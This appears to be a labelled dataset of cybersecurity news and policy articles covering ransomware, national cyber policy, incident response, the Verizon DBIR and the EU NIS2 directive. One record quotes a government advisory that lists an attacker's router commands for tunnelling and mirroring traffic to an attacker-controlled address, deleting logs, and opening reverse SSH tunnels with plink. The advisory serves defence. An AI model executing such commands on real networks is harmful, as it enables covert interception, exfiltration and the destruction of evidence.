These tools can also provide security teams with automated assessments of each threat, their business impact, and their associated risk, and subsequently share thorough descriptions and solutions for each. Vulnerability management capabilities that capture a complete view of an enterprise’s threat environment can help security teams understand their attack surface and save significant time, money, and resources that would have otherwise been spent focusing on lower priority items.

While this sounds ideal and drives directly to the goal of a risk-based incident response process, the simple truth is that there is a critical gap. Conventional tools such as firewalls and vulnerability scanners are necessary, but while they may cover system-level concerns in business-critical applications, they simply do not support the application itself. The underlying operating system vulnerability may be detected, but not the SAP custom code issue, or the E-Business Suite (EBS) application layer flaw.

Defending the enterprise crown jewels

Threat actors have the knowledge and capabilities today to directly target enterprises’ mission-critical applications and conduct highly sophisticated attacks. Only those organizations that are well-prepared will be able to protect their crown jewels and prevent the long-lasting implications of an attack against these systems.

Security officers and incident response teams need to prepare themselves to bring the same standards and the same security operations maturity that exist elsewhere in the IT environment into the formerly sacrosanct domain of the business-critical applications themselves. The attackers are already doing it; it’s time the defenders do, too.",Cybersecurity Failure,2022-05-26 07:00:00

Digital security is becoming more of an issue as vulnerabilities persist and existing solutions fail to prevent crime. Global corporate losses from ransomware attacks will total more than $20 billion in 2021, according to Cyber security Ventures. We seem to read about another large company or government agency being attacked, exposing sensitive customer and financial information. But worry not; here are the top cyber security trends to watch in 2022.

Mobile devices are the new target.

Mobile banking malware or attacks increased by 50 percent in 2019, making our handheld devices vulnerable to hacking. Every single photo, financial transaction, email, and the message we take poses a threat to us. In 2022, smartphone malware and viruses may catch the attention of cyber security trends due to the increasing use of smartphones.

AI’s potential as a tool for business

AI with the combination of machine learning has changed cyber security tremendously since it has been implemented in all market segments. Using AI has greatly enhanced automatic security systems, natural language processing, and face detection. These days, malware and attacks can also be developed to bypass the latest security protocols. A threat detection system that is powered by AI can detect new attacks and notify administrators in the event of a data breach immediately.

Pristine targets for data breaches

For organizations around the world, data will remain a leading concern. Protecting digital data is now the primary goal for both individuals and organizations. There are multiple ways for hackers to access your personal information through minor flaws or bugs in your browser or software. New measures like GDPR and CCPA are in place to safeguard consumer rights.

Automotive hackers on the rise

Nowadays, modern vehicles feature advanced software that provides seamless connectivity in terms of cruise control, engine timing, door locks, airbags, and driver assistance systems. Bluetooth and WiFi technologies can also compromise communication between these vehicles. In 2022, the use of automated vehicles is expected to grow, and users will be able to gain control and eavesdrop. Even more complex mechanisms are used by self-driving or autonomous vehicles, requiring strict cyber security measures.

A Vulnerable Cloud Also Exists

In light of the fact that more organizations are utilizing cloud computing, it is imperative to monitor and update security measures to safeguard data continuously. Even though Google and Microsoft cloud applications have good security from their end, user error, malicious software, and phishing attacks occur very frequently due to user negligence.

Getting connected with 5G: Technology and Risks in a New Era

An era of inter-connectedness will begin with 5G networks and the Internet of Things (IoT). Communication between multiple devices can also expose them to attacks, hacks, and software bugs from outside sources. A serious bug was found in Chrome, the most popular web browser supported by Google. Research is needed to find loopholes in 5G architecture to make the system safe against external attacks. We might not be aware of many network attacks accompanying the 5G network. 5G manufacturers must build sophisticated hardware and software to prevent data breaches.

Integration and automation

With the amount of data increasing every day, it is imperative to automate sophisticated data control. Today’s professionals and engineers are also pressured to deliver quick and efficient solutions, fueling a rise in automation applications. Web applications with large and complex functionality are even harder to secure, making automation and cyber security essential software development components. As part of the agile development process, security measurements are incorporated into building more secure software.

Specifically targeted ransomware

Targeted ransomware is another trend we can’t seem to ignore in cybersecurity. Although ransomware generally threatens to publish a victim’s data if a ransom payment is not made, it can still affect organizations or nations in general. Specialized software is a necessary part of many industries in developed countries.

Cyberwarfare sponsored by governments

The west and east can’t stop trying to find superiority. Despite the few attacks, tensions between the US and Iran or Chinese hackers often dominate worldwide news and can make or break an election. Additionally, more than 70 elections will take place this year, which will lead to a surge in criminal activity. As for cybersecurity trends for 2022, major data breaches, political intrigue, and industrial secrets are expected to dominate.

Cybersecurity is going to be expensive, no matter what. In the future, trustworthy computing will be a crucial component of how companies and organizations protect their products, customers, and data.",Cybersecurity Failure,2022-06-13 02:03:35

Criminal cyber attacks that deprive access to vital digital information and hold it for ransom are a constant and ever-increasing threat. No organization is immune.

Due to the exponential rise in ransomware attacks, cyber insurance coverage for ransom payments – one of the tools for mitigating cyber risk – now requires steeper premiums for much less coverage. Some argue that insurers’ payments have contributed to the increase in attacks. Meanwhile, the FBI continues to warn that paying a ransom is never a guarantee that encrypted data will be recovered.

Whether to pay a ransom has now become a matter of state public policy. In an effort to deter ransomware attacks on state agencies, North Carolina became the first state to enact laws prohibiting the use of tax dollars to pay ransoms (N.C.G.S. 143‑800). Pennsylvania is considering following suit. A proposed ban on ransom payments in New York would extend to private companies (see New York State Senate Bill S6806A). Whether these efforts will successfully deter cybercrime remains to be seen.

These developments serve as a reminder to focus on cybersecurity fundamentals. Organizations should review their cybersecurity measures on a regular basis as a matter of good governance. Simple security measures such as multifactor authentication and providing regular employee training on phishing and other social engineering scams can make all the difference.

Whether paying ransoms causes an increase in ransomware attacks by emboldening criminals will continue to be debated. But any such increase likely pales in comparison to the risks associated with the failure to institute appropriate cybersecurity measures. Too many organizations remain easy pickings.",Cybersecurity Failure,2022-06-07 16:20:30

The Cyber Governance Policy Committee was established to formulate cybersecurity policy and identify the organizational, technical, and legal requirements for policy implementation.","Pakistan falls among the developing countries that have recently experienced the fast-growing application of information and communication technologies, particularly the internet. According to Pakistan Telecommunication Authority (PTA) data, the country’s internet penetration rate stands at 52.60 percent as of April 2022. Internet usage saw a surge following the accelerated shift to cyberspace for work and business amid the pandemic. Consequently, Pakistan is increasingly adopting e-services across its economy and government. To develop its digital ecosystem, comprised of technological infrastructure and institutional frameworks, Pakistan has adopted the Digital Pakistan Policy. These trends and measures indicate that digitization has become an ever-growing phenomenon in Pakistani society and government.

Notwithstanding its advantages, increasing digitization makes Pakistan vulnerable to various cyber threats, particularly because it is lacking in cybersecurity readiness. Pakistan faces a huge gap in the demand and supply for information system protections. In its 2020 global cybersecurity rankings, the International Telecommunication Union (ITU), ranked Pakistan seventy-ninth among its 193 member states and fourteenth out of thirty-eight Asia-Pacific states. The ITU measures a state’s commitment to cybersecurity on the basis of five categories: legal, technical, organizational, capacity development, and cooperation. Though Pakistan has adopted a number of cybersecurity laws over the years, it needs updates and more specific, policy-guided legislation. Pakistan’s main cybersecurity law, the 2016 Prevention of Electronic Crime Act, identifies a range of cybercrimes, including cyberterrorism, cyberstalking, electronic fraud, hate speech, and unauthorized interference with critical infrastructure. However, PECA has been criticized for vaguely defining the cybercrimes, failing to specify what constitutes critical infrastructure, and undermining freedom of expression. In addition, the act lacks a clear and comprehensive enforcement mechanism due to Pakistan’s shortage of cybersecurity institutional infrastructure.

Regarding technical cybersecurity measures, Pakistan has yet to develop an effective mechanism to deal with cyber risks and incidents. To provide information on cyber threats, assistance, and capacity-building in cybersecurity, Pakistan has two private bodies: the Pakistan Computer Emergency Response Team (PakCERT) and the Pakistan Information Security Association Computer Emergency Response Team (PISA-CERT). There are also some organizations in the public, private, and defense sectors where specific cybersecurity mechanisms exist. Nevertheless, Pakistan has to establish a national CERT to develop a centralized and coordinated response mechanism to address cybersecurity threats. This must be complemented with sector-specific and organization-specific CERTs.

In terms of organizational measures, successive Pakistani governments have failed in undertaking national cybersecurity policy. While Pakistan introduced the Digital Pakistan Policy in 2017, it only adopted its maiden national cybersecurity policy in July 2021. The absence of a cybersecurity policy has contributed significantly to the country’s low performance in meeting cybersecurity criteria, particularly those related to technical, capacity-building, and collaboration measures. Cybersecurity policy and strategy is the foremost step toward a well-defined governance system and posture for cybersecurity. The country does not have a full-fledged organization at the national level mandated for cybersecurity. Rather, it has the National Response Centre for Cyber Crime (NR3C), which functions as a unit under the Federal Investigation Agency. The NR3C reportedly lacks the resources and facilities needed to efficiently investigate complicated cybercrimes.

Pakistan has undertaken some significant initiatives for capacity development in cybersecurity, but much still remains to be done. The Pakistan Telecommunication Authority has established a Cyber Vigilance Division that comprises three directorates: information and communication technology (ICT), cybersecurity, and vigilance. The ICT Directorate is responsible for developing the capacity of the industrial sector through research and analysis, the provision of IT infrastructure, and the organization of conferences and meetings involving stakeholders. The Vigilance Directorate detects and controls—through technical solutions and law enforcement—gray traffic and unauthorized IP addresses. The Cyber Security Directorate provides assistance in policy formulation, conducts security audits of applications and infrastructure, and issues advisories and guidelines to address cyber threats. In addition, Pakistan has established the National Centre for Cyber Security and introduced academic degrees in cybersecurity to push learning and research in this area. Alongside these nascent developments, the country needs to adopt more capacity development measures, particularly best practices, public awareness campaigns, professional training courses, incentive mechanisms, and homegrown industry.

Being a transnational issue due to the interconnectedness and correlated infrastructure, cybersecurity must entail cooperative measures through bilateral and multilateral agreements, participation in international activities, and public-private partnerships. Though PECA, Pakistan’s cyber law, stipulates a mechanism for international cooperation in cybersecurity, the country lacks practical initiatives. Pakistan has membership in the International Multilateral Partnership against Cyber Threats (ITU-IMPACT) and maintains an international liaison with a few regional computer emergency response teams through PISA-CERT. However, the country lacks other collaborative measures, particularly international cybersecurity agreements and public-private partnerships. According to the International Telecommunication Union’s 2020 global cybersecurity index, countries are increasingly concluding international cybersecurity agreements for capacity development and information-sharing. But Pakistan has not negotiated or concluded any such agreement as of now.

Pakistan’s Cybersecurity Profile (ITU-GCI 2020)

Pakistan’s low profile in cybersecurity is primarily due to the lack of political will to prioritize the issue. This fundamental problem has resulted in the non-existence of a long-term cybersecurity policy framework and a paucity of cybersecurity institutional mechanisms. However, as the adoption of the country’s first-ever cybersecurity policy shows, there is a growing political realization in Pakistan that cybersecurity should move higher on the policy agenda. The basic objective of the national cybersecurity policy is to build governance and institutional frameworks for information security and critical infrastructure. The Cyber Governance Policy Committee was established to formulate cybersecurity policy and identify the organizational, technical, and legal requirements for policy implementation. The key policy deliverable in this regard is the designation of an organization under the federal government to act as the central entity for the coordination and implementation of all cybersecurity matters.

Though the maiden Pakistani cybersecurity policy is comprehensive in terms of its objectives and the corresponding targets, it carries certain ambiguities. Foremost, the policy leaves the lingering issue of central responsibility unsettled by failing to designate a federal organization responsible for cybersecurity across the country. Second, the policy does not specify what exactly comprises critical infrastructure and what will be the policy response if a cyberattack is launched on them. Finally, the policy does not provide a timeframe and roadmap for achieving the prescribed organizational, technical, legal, capacity development, and collaborative measures. Pakistan has taken an important first step, but there remains much work to be done.

Surprised?

Well, SME owners and entrepreneurs often have difficult decisions to make, and cybersecurity becomes an afterthought to them. In turn, their businesses suffer the consequences of such an oversight. In 2021, more than 45% of security and data breaches impacted small businesses, among which phishing and denial-of-service attacks were the most common attack vectors.

Keeping small businesses and startups safe from hackers, data breaches, and losses requires more than antivirus software or a firewall. Undoubtedly, with the phenomenal world of opportunities – the Internet – where almost 150 TB of Internet traffic takes place each second, businesses now have the competency to reach wider and larger audiences, customers, and clients from all over the globe.

At the same time, cybersecurity has become a foundational element of keeping a business running in today’s world. Every business owner must be aware of cyber threats, regulatory compliance, and the company’s security posture to assess where existing vulnerabilities may exist and could make them a target of cybercriminals. Entrepreneurs that are proactive in their security and risk management process and educate themselves on cyber trends and programs will stay ahead of their competition.

Implementing Small Business Security Plans

A common misconception is that a cyberattack will never happen to your business because you are new or too small to be targeted, but that is untrue.

Cybersecurity is undoubtedly crucial for any business – whether it’s a million-dollar corporation or a startup. But startups are more prone to data breaches and cyberattacks because there is a shortage of experienced professionals, smaller budgets, limited security awareness, old security measures, and failure in securing endpoints.

Startups might not have an enormous scope of threat like larger businesses, but they still are entrusted with sensitive customer and employee information – and this is exactly what hackers are interested in.

Data from Verizon’s 2020 Data Breach Investigations Report (DBIR) clearly specifies that 28% of small businesses were victims of data breaches. And considering US Small Business Administration’s (SBA) Office of Advocacy data, 99.9% of all businesses in the US are small businesses having less than 500 employees. Hence, plenty of startups and companies need help with cyber security.

Moreover, the slightest hiccup can hinder business growth. According to Hiscox Cyber Readiness Report, nearly 65% of small businesses have experienced some form of cybercrime, and among those, 60% of startups bust within the first six months of operations.

Small businesses and startups can remain strong and steadfast against threats in their early stages by positioning cyber and IT risk management as a core function of the business. Without any professional monitoring of their risk and security posture, leaders will continue to make uninformed decisions based on dated or non-existing assessments.

Best Practices For Protecting Small Businesses

Now that you are aware of the seriousness of cyberattacks, you are ready to tackle cybersecurity. Here are some tips to protect your small business from cyberattacks and hackers.

Be proactive and prevent damage before cyberattacks spiral out of control.

Increase awareness regarding the significance of cybersecurity

Keep an eye on your social media accounts

Get hold of the right tool that offers an all-in-one solution

Create a culture of cybersecurity

Secure software and applications being used by the workforce

Implement multifactor authentication and single sign-on

Post startup CISO jobs to get hold of competent IT professionals

Invest in cost-effective anti-malware, firewall, and security software

Create a robust cybersecurity plan

Protect your payment gateways

Advance Your Cybersecurity

With a limited budget, hiring a costly security consultant doesn’t seem like a viable option for your security solution. But, startups and SMBs can rely on CyberBase to do all the work for them in a single platform for your peace of mind. Monitor compliance in real-time, automate assessments, and crosswalk against multiple standards and frameworks with CyberBase.

Entities can mitigate the vulnerabilities listed in this advisory by applying the available patches to their systems, replacing end-of-life infrastructure, and implementing a centralized patch management program.

NSA, CISA, and the FBI urge U.S. and allied governments, CI, and private industry organizations to apply the recommendations listed in the Mitigations section and Appendix A: Vulnerabilities to increase their defensive posture and reduce the risk of PRC state-sponsored malicious cyber actors affecting their critical networks.

Common vulnerabilities exploited by People’s Republic of China state-sponsored cyber actors

PRC state-sponsored cyber actors readily exploit vulnerabilities to compromise unpatched network devices. Network devices, such as Small Office/Home Office (SOHO) routers and Network Attached Storage (NAS) devices, serve as additional access points to route command and control (C2) traffic and act as midpoints to conduct network intrusions on other entities. Over the last few years, a series of high-severity vulnerabilities for network devices provided cyber actors with the ability to regularly exploit and gain access to vulnerable infrastructure devices. In addition, these devices are often overlooked by cyber defenders, who struggle to maintain and keep pace with routine software patching of Internet-facing services and endpoint devices.

Since 2020, PRC state-sponsored cyber actors have conducted widespread campaigns to rapidly exploit publicly identified security vulnerabilities, also known as common vulnerabilities and exposures (CVEs). This technique has allowed the actors to gain access into victim accounts using publicly available exploit code against virtual private network (VPN) services [T1133] or public facing applications [T1190]—without using their own distinctive or identifying malware—so long as the actors acted before victim organizations updated their systems.

PRC state-sponsored cyber actors typically conduct their intrusions by accessing compromised servers called hop points from numerous China-based Internet Protocol (IP) addresses resolving to different Chinese Internet service providers (ISPs). The cyber actors typically obtain the use of servers by leasing remote access directly or indirectly from hosting providers. They use these servers to register and access operational email accounts, host C2 domains, and interact with victim networks. Cyber actors use these hop points as an obfuscation technique when interacting with victim networks.

These cyber actors are also consistently evolving and adapting tactics to bypass defenses. NSA, CISA, and the FBI have observed state-sponsored cyber actors monitoring network defenders’ accounts and actions, and then modifying their ongoing campaign as needed to remain undetected. Cyber actors have modified their infrastructure and toolsets immediately following the release of information related to their ongoing campaigns. PRC state-sponsored cyber actors often mix their customized toolset with publicly available tools, especially by leveraging tools that are native to the network environment, to obscure their activity by blending into the noise or normal activity of a network.

NSA, CISA, and the FBI consider the common vulnerabilities and exposures (CVEs) listed in Table 1 to be the network device CVEs most frequently exploited by PRC state-sponsored cyber actors since 2020.

Telecommunications and network service provider targeting

PRC state-sponsored cyber actors frequently utilize open-source tools for reconnaissance and vulnerability scanning. The actors have utilized open-source router specific software frameworks, RouterSploit and RouterScan [T1595.002], to identify makes, models, and known vulnerabilities for further investigation and exploitation. The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices. RouterScan is an open-source tool that easily allows for the scanning of IP addresses for vulnerabilities. These tools enable exploitation of SOHO and other routers manufactured by major industry providers, including Cisco, Fortinet, and MikroTik.

Upon gaining an initial foothold into a telecommunications organization or network service provider, PRC state-sponsored cyber actors have identified critical users and infrastructure including systems critical to maintaining the security of authentication, authorization, and accounting. After identifying a critical Remote Authentication Dial-In User Service (RADIUS) server, the cyber actors gained credentials to access the underlying Structured Query Language (SQL) database [T1078] and utilized SQL commands to dump the credentials [T1555], which contained both cleartext and hashed passwords for user and administrative accounts.

Having gained credentials from the RADIUS server, PRC state-sponsored cyber actors used those credentials with custom automated scripts to authenticate to a router via Secure Shell (SSH), execute router commands, and save the output [T1119]. These scripts targeted Cisco and Juniper routers and saved the output of the executed commands, including the current configuration of each router. After successfully capturing the command output, these configurations were exfiltrated off network to the actor’s infrastructure [TA0010]. The cyber actors likely used additional scripting to further automate the exploitation of medium to large victim networks, where routers and switches are numerous, to gather massive numbers of router configurations that would be necessary to successfully manipulate traffic within the network.

Armed with valid accounts and credentials from the compromised RADIUS server and the router configurations, the cyber actors returned to the network and used their access and knowledge to successfully authenticate and execute router commands to surreptitiously route [T1599], capture [T1020.001], and exfiltrate traffic out of the network to actor-controlled infrastructure.

While other manufacturers likely have similar commands, the cyber actors executed the following commands on a Juniper router to perform initial tunnel configuration for eventual exfiltration out of the network:

set chassis fpc <slot number> pic <user defined value> tunnel-services bandwidth <user defined value>

set chassis network-services all-ethernet

set interfaces <interface-id> unit <unit number> tunnel source <local network IP address>

set interfaces <interface-id> unit <unit number> tunnel destination <actor controlled IP address>



After establishing the tunnel, the cyber actors configured the local interface on the device and updated the routing table to route traffic to actor-controlled infrastructure.

set interfaces <interface-id> unit <unit number> family inet address <local network IP address subnet>

set routing-options static route <local network IP address> next-hop <actor controlled IP address>



PRC state-sponsored cyber actors then configured port mirroring to copy all traffic to the local interface, which was subsequently forwarded through the tunnel out of the network to actor-controlled infrastructure.

set firewall family inet filter <filter name> term <filter variable> then port-mirror

set forwarding-options port-mirroring input rate 1

set forwarding-options port-mirroring family inet output interface <interface-id> next-hop <local network IP address>

set forwarding-options port-mirroring family inet output no-filter-check

set interfaces <interface-id> unit <unit number> family inet filter input <filter name>

set interfaces <interface-id> unit <unit number> family inet filter output <filter name>



Having completed their configuration changes, the cyber actors often modified and/or removed local log files to destroy evidence of their activity to further obfuscate their presence and evade detection.

sed -i -e '/<REGEX>/d' <log filepath 1>

sed -i -e '/<REGEX>/d' <log filepath 2>

sed -i -e '/<REGEX>/d' <log filepath 3>

rm -f <log filepath 4>

rm -f <log filepath 5>

rm -f <log filepath 6>



PRC state-sponsored cyber actors also utilized command line utility programs like PuTTY Link (Plink) to establish SSH tunnels [T1572] between internal hosts and leased virtual private server (VPS) infrastructure. These actors often conducted system network configuration discovery [T1016.001] on these host networks by sending hypertext transfer protocol (HTTP) requests to C2 infrastructure in order to illuminate the external public IP address.

plink.exe –N –R <local port>:<host 1>:<remote port> -pw <user defined password> -batch root@<VPS1> -P <remote SSH port>

plink.exe –N –R <local port>:<host 2>:<remote port> -pw <user defined password> -batch root@<VPS2> -P <remote SSH port>

The Cyber Security Breaches Survey published by the government earlier this year reported that cyber security was a ""high priority"" for virtually all businesses.

However, that same survey revealed that just 19% of businesses have a formal incident response plan in place setting out the steps that ought to be taken in the immediate aftermath of a cyber attack.

Every business should have an incident response guide which sets out:

the names and contact details of the people who will work together to resolve the incident; and

the initial steps that should be taken upon discovering a cyber security incident.

The incident response team

One of the main priorities of an incident response plan is to create an incident response team which will deploy in the event of an attack. The plan should be kept up to date and include emergency contact details for the core incident response team.

The incident response team should include:

An Incident Response Manager

This person is likely to be a senior manager within your organisation who will spearhead the incident response team.

A Deputy Incident Response Manager

This person will be responsible for documenting the findings of an investigation into a cyber security incident and is likely to be a manager within your organisation.

IT contact

This person will be responsible for (i) discovering and undertaking an initial assessment of a cyber security incident; (ii) containing and eradicating a cyber security incident; and (iii) assisting any external digital forensics experts instructed in respect of a cyber security incident. This person is likely to be a senior and experienced member of your IT team.

Legal contact

This person will be responsible for managing the legal or regulatory issues arising following a cyber security incident. This person is likely to be a member of your in-house legal team or a member of senior management who is typically tasked with instructing external lawyers.

PR and Communications contact

This person will be responsible for communicating with clients, third parties and the media following a cyber security incident. This person is likely to be a member of your PR and Communications team or the person who is typically tasked with instructing external PR/Communications agencies.

HR contact

Please provide the following information for the person who will manage all communications with employees in the event of a cyber security incident. This person will be a member of your Human Resources team.

Initial steps

An effective incident response plan will map out the initial steps that are required to be taken upon the discovery of a cyber threat.

These steps typically include:

Preliminary assessment

If you think you have suffered a data breach or cyber incident, it is important that you immediately assess the impact it will have on your business.

Specialist legal and technical advice should be sought immediately in the event that a significant threat is encountered, particularly in view of the fact that, in those circumstances, it is likely that the Information Commissioner’s Office will be required to be notified within 72 hours of the incident being discovered.

Mobilise your internal incident response team

Once the incident has been reported to the appropriate external advisers, the internal incident response team should be mobilised.

Your Incident Response Manager should be trained to ensure that the investigation into the incident progresses in accordance with best practice. They will also manage the flow of information to external advisers.

The internal investigation: initial stages

Your Incident Response Manager should ensure that:

all affected computers are taken offline. They should not be turned off or examined until such time as the appropriate digital forensics team arrives; and

everything known about the breach is carefully documented, including who discovered it, who reported it, to whom it was reported, the type of breach that occurred, what systems are affected, what information is at risk and the effect it has on the business.

Protecting privilege

It is important that the internal investigation into the incident does not unwittingly create documents which could prove to be incriminating in any regulatory investigation which follows a data breach or cyber incident.

Contact the appropriate agencies

It is possible that any data breach or cyber incident suffered will need to be reported to a number of different regulatory bodies, including the Information Commissioner’s Office.

Depending on the nature and extent of the breach, it may also be appropriate to report the matter to the relevant law enforcement agencies.

Conclusion

Investment in establishing an effective incident response plan brings with it many benefits including improved resilience, a greater chance of achieving business continuity and a reduction in the financial impact of a cyber attack.

The old adage of failing to prepare is preparing to fail is particularly true as far as cyber attacks are concerned. A business could not possibly take the appropriate steps to contain and manage the plethora of issues which flow from a cyber attack in the panic and confusion that follow its discovery.

It is therefore important that the plan is produced and tested in a safe and sedate environment prior to an attack occurring.",Cybersecurity Failure,2022-06-08 21:11:45

Well-implemented security awareness programs take advantage of this blurring to encourage their staff to care about security.","The data in the new Verizon ""Data Breach Investigations Report"" (DBIR) offers critical insights into the current state of cybersecurity. After a year of data breaches and cyberattacks consistently dominating headlines, this year's report closely examines what adversaries are looking for when they're trying to infiltrate businesses and organizations. This year's DBIR, the 15th edition, confirms what we assumed: Cyber threats are on the rise and we must work together to better our security posture. The findings collected in the report are timely for the trained security researcher, but here are three takeaways I think are the most important.

Conducting the Symphony of Disruption

The most common action that adversaries are taking to disrupt their target's IT ecosystem is launching denial-of-service (DoS) attacks that effectively flood a network with traffic or information in the pursuit of crashing it. The 2022 DBIR says that 46% of all incidents were DoS attacks, followed by remote access–led attacks, including backdoor and command-and-control-based attacks. Distracting and disrupting the IT and security teams in this way can help obfuscate and bury the other adversarial activities in their toolkit as they look for their initial access.

Ransomware, phishing, stolen credentials, and several other types of attacks round out the list, but one attack vector stands out from the rest. More than 60% of security incidents over the past year were conducted through a Web application, consistent with data collected by Verizon in past years.

Because Web applications — closely followed by email — are where your organization most frequently connects to the Internet, it makes sense that they'd be the primary vectors for threat actors trying to breach your environment. While a Web application may fall victim to a hacker proficient with SQL or with an exploit handy, email is the domain of virtually every employee at every organization. That's why social engineering played a role in nearly all 5,212 breaches recorded in the 2022 DBIR.

Is Your Human Secure?

The 2022 DBIR highlights the importance of maintaining a strong security awareness program, which I believe is a critical element of securing an organization. Just about 82% of all breaches recorded last year involved social engineering in some form, with threat actors preferring to phish their targets via email more than 60% of the time.

Though the DBIR found just 2.9% of employees actually clicked on phishing emails last year, that's more than enough for hackers to work with, especially if they're able to steal credentials or dump their malware of choice following the phish. For me, the important point is that there is a continuing trend for staff to report more phishing attempts – and even more importantly, to report them after they have responded to a phishing email.

Building an organizational culture that allows staff to be comfortable admitting they were duped is a difficult task because security awareness traditionally is a stick used to punish people and a metric to cover the company's compliance checkboxes.

Security leaders need to create a program that goes of their organization and doesn't just shame them for failing. For example, we need to create programs that don't automatically ""fail"" someone for clicking a link, because that's why links exist! A program that seeks to trick their own colleagues into failing is generally unproductive in the educational process and does almost nothing for the company's security posture.

A good security awareness training program is consistent, targeted, and limited in scope to allow employees to learn and practice one security skill at a time. Avoiding information overload will keep employees engaged and ready for emerging threats.

And lastly, security awareness is not just a corporate project. Strong awareness and education will help staff be more aware of digital risks in their personal lives as well. Well-implemented security awareness programs take advantage of this blurring to encourage their staff to care about security.

The Ransomware Business Is Booming

Ransomware, to nobody's surprise, is increasing in frequency by 13% over the prior year, with almost 70% of malware breaches involving some form of it. The dramatic increase in ransomware attacks — as large as the increases of the last five years combined, according to the report — makes sense, as hackers looking to make a quick buck need only encrypt their target's data rather than seek out specific financial information or credentials within their environment.

The report also states that 40% of ransomware incidents last year involved the use of desktop-sharing software. For example, cybercriminals used this tactic when exploiting vulnerabilities in Microsoft RDP, or just weak or stolen user credentials. On the other hand, 35% of ransomware incidents involved the use of email, leading to researchers recommending that organizations lock down their RDP and ensure their emails are scanned for potential phishing attempts. How we are in 2022 and still suffering from attacks over such a well-known attack vector as email is surely one of the biggest questions to come out of this report.

Final Thoughts

The DBIR is an excellent resource for the cybersecurity community to evaluate a tumultuous past 12 months, and the data within can be evaluated to predict the trends in attack types, vectors, and the motivations of hackers throughout the next year. In 2021, adversaries made it clear they were more focused on money than anything else, and with vulnerability exploits doubling from the previous year, it's a safe bet to say that once again the fundamentals of cybersecurity – across both IT hygiene and human engagement – will be the key to reducing the risk of damage and loss.",Cybersecurity Failure,2022-06-13 14:05:27

Saudi experts are warning against aggravating cybersecurity breaches as the effects of the Russian-Ukrainian war take a toll. So far, Saudi efforts have led to adding 40 job roles for cadres working in the field of cybersecurity.

Field specialists estimated the global shortage of human cadres at more than 3 million jobs.

Saudi Arabia has become more in need of qualified human personnel due to the expansion of its technology market, which is close to a fifth of the entire market size in the Middle East.

A seminar on the national economic effects of cybersecurity showed that about 85% of cybersecurity problems are caused by human errors.

However, cyber awareness and the use of technology and job examinations with human cadres can reduce these errors.

Majed Al-Sahli, a specialist in strategy and international cooperation at the National Cybersecurity Authority (NCA), stressed that the national cybersecurity strategy reflects Saudi Arabia’s ambition in a balanced manner.

The Kingdom’s strategy is divided between safety, trust, and growth.

“The strategy is based on several foundations, namely processes, procedures, techniques and human cadres,” Al-Sahli told Asharq Al-Awsat.

In an economic forum, Al-Sahli reviewed controls developed by the NCA.

These controls included the development of cloud computing controls, operational systems, e-commerce, and remote work.

Al-Sahli pointed out the role of the coronavirus pandemic in accelerating the development process of controls.

He highlighted several of the authority’s initiatives, such as capacity building, reducing risks, and democratizing cybersecurity.

Al-Sahli also reviewed national partnerships that led to the launch of the Saudi framework for cybersecurity forces and the addition of 40 job roles in cooperation with the General Authority for Statistics and the Ministry of Human Resources and Social Development.

Moreover, the Kingdom is working on cyber education, which is a promising project that could support and graduate qualified cadres.

Saudi Arabia is more in need of qualified cadres due to the size of the technology market in the Kingdom, which is approximately 17% of the market size in the Middle East.

The Kingdom’s sizable share of the technology market in the region represents a challenge in terms of bridging the gap found in human cadres.

Regulatory fines at this scale in other jurisdictions, notably in the US and UK, have generated greater cybersecurity measures.","All 27 members of the European Union, on May 19, agreed to bring in tougher cybersecurity rules with their agreement on the new Network and Information Security (NIS2) Directive, which was first proposed in December, 2020.

The new measures, created in response to increased digitisation and the rise of malicious cyber activity globally, look to boost the cyber resilience of entities across a range of sectors deemed critical for the economy and society. Unlike the 2016 NIS directive, the new Directive includes healthcare, medical devices, energy grids, digital services, waste management, critical product manufacturing and public administration in its scope.

The NIS2 Directive also aims to increase the cybersecurity requirements imposed on companies with new standards and reporting rules. This includes provisions for top management accountability for any non-compliance with the cybersecurity obligations and measures to increase the collective European cyber-resilience in both public and private sectors.

Why it matters: The original NIS Directive, while contributing to improving cyber security, left too many gaps and discretion to individual member states. Ambiguity regarding the laws added to a lack of accountability measures and fragmented implementation by member states were just some of the faults with the original NIS Directive. Gaps in approaches lead to friction, act as a barrier to trade and eventually lead to more risk to businesses and individuals. This is why the NIS2 is so important to the cybersecurity community.

The NIS2 Directive comes with a broader scope

The NIS2 Directive significantly expands the current scope of application, which is of major importance. Growing interconnectedness, rapid digitisation and ubiquitous connectivity mean more sectors are becoming systemically important to defend from cyber risk than before.

The new rules have added seven new industries in both the public and private sectors to its scope.

Providers of public electronic communications networks or services: In 2020 alone, the EU member states reported a total of 170 telecom security incidents resulting in 841 million lost user hours and gathering support for the NIS2 directive. Till now, European telecom operators notified “significant” security incidents to their national authorities, who would compile a report for the EU Cybersecurity Agency at the end of each year.

Waste and water management: The nature of public water systems and its limited operational technology usage make them attractive to attackers as they have the potential to harm the environment, economies and citizens. The inclusion of waste disposal and water management fall under the EU’s new directives seems to be a wise precautionary measure.

Manufacturers of certain critical products: The new directive sets out to cover the healthcare sector more broadly than before by including medical device and pharmaceutical manufacturers in its scope, though there are concerns that it might overlap existing medical device regulations.

Food: The new cybersecurity obligations will now cover all medium to large-sized enterprises in the food distribution sector as a ‘critical’ sector.

Digital services such as social networking platforms and data centers: Social media platforms will have to make incident reports and if the company is based outside the EU then it has to keep a representative in the EU to address grievances. Incident report rules also apply to domain name, service providers, and data banks.

Space: The European Union Agency for Space Programme will also fall under the ambit of the directives as will its member agencies to a certain degree. The NIS2 Directives recommend the EUASP to have some influence as to how satellite data management policies under the NIS2 directives will operate.

Postal and courier services: Europeans’ increasing dependence on postal services during the pandemic has seen the EU cover its members’ postal and courier entities under its cybersecurity framework. Postal company servers contain sensitive information such as names, addresses, contact details, etc, and may pose as an attractive target to threat actors.

Standard rules for public administration websites: So far, individual member governments had been maintaining their own cybersecurity infrastructure, with the 2016 NIS recommendations serving as a standard but not a mandate, but now all member states’ administration websites and servers need to abide by the same rules.

The NIS2 Directive’s redefining of its original scope to now be more clear in covering “essential services” means companies will be undertaking measures to increase their cyber resilience at a much larger scale across the continent.

What are the major changes in the NIS2 Directive?

The following are the three broad changes that the NIS2 wishes to implement in a synchronised, centralised manner across the European Union.

